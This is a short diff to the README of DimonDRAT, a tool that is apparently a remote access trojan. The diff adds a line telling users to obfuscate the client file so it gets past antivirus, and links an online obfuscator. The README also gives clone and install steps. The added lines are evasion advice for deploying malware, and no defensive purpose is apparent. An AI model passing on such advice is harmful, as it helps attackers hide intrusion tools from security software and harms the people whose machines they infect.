@@ -5,6 +5,9 @@
 # License: I do not allow to make any modifications in my software and I also deny the commercial use of it, however, I allow to publish a review on YouTube about this software, but remember to credit me!
 # Installation:
 
+!NOTE! : To bypass antivirus obfuscate the client.py file!!!
+Good online obfuscator: https://pyob.oxyry.com/
+
 1. git clone https://github.com/SegYT/DimonDRAT
 2. cd DimonDRAT
 3. pip install -r requirements.txt
